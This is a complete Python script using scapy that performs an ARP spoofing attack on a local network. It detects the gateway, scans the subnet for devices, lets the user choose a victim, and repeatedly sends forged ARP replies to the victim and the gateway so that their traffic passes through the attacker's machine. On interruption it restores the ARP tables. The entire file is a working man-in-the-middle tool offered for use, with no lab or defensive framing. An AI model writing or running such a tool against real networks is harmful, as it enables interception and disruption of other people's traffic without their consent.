import os
import sys
import time
from scapy.all import ARP, Ether, srp, send, conf, get_if_addr

def get_network_info():
    """Automatically determines the gateway IP and local network range."""
    try:
        gateway_ip = conf.route.route("0.0.0.0")[2]
        local_ip = get_if_addr(conf.iface)
        ip_range = gateway_ip.rsplit('.', 1)[0] + '.0/24'
        print(f"[*] Gateway found: {gateway_ip}")
        print(f"[*] Network range set to: {ip_range}")
        return gateway_ip, local_ip, ip_range
    except Exception as e:
        print(f"[!] Could not determine network info: {e}")
        return None, None, None

def get_devices_on_network(ip_range):
    """Scans the network to find devices and their MAC addresses."""
    print(f"[*] Scanning for devices in {ip_range}...")
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    devices = [{'ip': r.psrc, 'mac': r.hwsrc} for s, r in answered_list]
    return devices

def display_targets(targets):
    """Prints a list of valid targets for the user to choose from."""
    print("\n--- Available Targets ---")
    if not targets:
        print("No other devices found on the network.")
    else:
        for i, device in enumerate(targets):
            print(f" {i}) IP: {device['ip']}\tMAC: {device['mac']}")
    print("-------------------------\n")

def poison(target_ip, target_mac, gateway_ip, gateway_mac):
    """Sends ARP poison packets to the target and the gateway."""
    # Packet to poison the target's ARP cache
    poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Packet to poison the gateway's ARP cache
    poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    print(f"[*] Beginning ARP poison attack on {target_ip} and {gateway_ip}. Press CTRL+C to stop.")
    sent_packets_count = 0
    try:
        while True:
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            sent_packets_count += 2
            sys.stdout.write(f"\r[*] Packets sent: {sent_packets_count}")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP poison attack. Restoring network...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restores the ARP tables of the target and gateway."""
    # Send ARP packets with the correct MAC addresses to restore the network
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
    print("[*] Network restored to normal.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    gateway_ip, local_ip, ip_range = get_network_info()
    if not all((gateway_ip, local_ip, ip_range)):
        sys.exit(1)

    all_devices = get_devices_on_network(ip_range)
    gateway_mac = ""
    for dev in all_devices:
        if dev['ip'] == gateway_ip:
            gateway_mac = dev['mac']
            break
            
    if not gateway_mac:
        print("[!] Could not find gateway MAC address. Exiting.")
        sys.exit(1)

    targets = [dev for dev in all_devices if dev['ip'] not in [gateway_ip, local_ip]]
    
    display_targets(targets)
    if not targets:
        sys.exit(1)
        
    try:
        choice = int(input("Choose a target device number to poison: "))
        if 0 <= choice < len(targets):
            target_device = targets[choice]
            print(f"[*] Selected Target: {target_device['ip']}")
            poison(target_device['ip'], target_device['mac'], gateway_ip, gateway_mac)
        else:
            print("[!] Invalid selection. Index out of range.")
    except (ValueError, IndexError):
        print("[!] Please enter a valid number.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")